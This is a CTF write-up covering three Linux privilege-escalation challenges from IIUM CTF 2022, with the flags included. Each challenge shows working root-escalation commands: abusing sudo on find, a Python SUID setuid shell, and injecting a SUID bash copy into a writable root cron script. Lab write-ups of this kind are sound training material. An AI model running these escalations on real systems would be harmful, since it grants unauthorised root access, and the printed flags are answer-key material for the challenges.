---
title: "IIUM CTF 2022 — Linux Challenges Writeup"
date: 2022-05-14 10:00:00 +0800
categories: [sig22ctf-IIUM]
tags: [ctf, linux, priv-esc, mis-config]
---

> We placed **1st** at IIUM CTF 2022. This post covers the Linux category challenges.

---

## Challenge 1 — "Low Hanging Fruit"

**Points:** 100 | **Category:** Linux

Given SSH credentials for a low-privilege user. First thing: check what the user can run as sudo.

```bash
sudo -l
```

```
(root) NOPASSWD: /usr/bin/find
```

GTFObins to the rescue:

```bash
sudo find . -exec /bin/bash \; -quit
```

Instant root. Flag at `/root/flag.txt`.

```
FLAG{sud0_f1nd_is_d4ng3r0us}
```

---

## Challenge 2 — "Sticky Fingers"

**Points:** 200 | **Category:** Linux — SUID

Find SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

`/usr/bin/python3` had the SUID bit set.

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Root shell. Flag at `/root/flag.txt`.

```
FLAG{su1d_py3_t0_r00t}
```

---

## Challenge 3 — "Cron Secrets"

**Points:** 300 | **Category:** Linux — Cron

After initial foothold as `ctfuser`, enumerated cron jobs:

```bash
cat /etc/crontab
ls -la /opt/scripts/
```

Found `/opt/scripts/cleanup.sh` running every minute as root — writable by our user:

```bash
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /opt/scripts/cleanup.sh
# wait 60 seconds
/tmp/bash -p
```

Root. Flag at `/root/flag.txt`.

```
FLAG{cr0n_wr1t3_pr1v3sc}
```
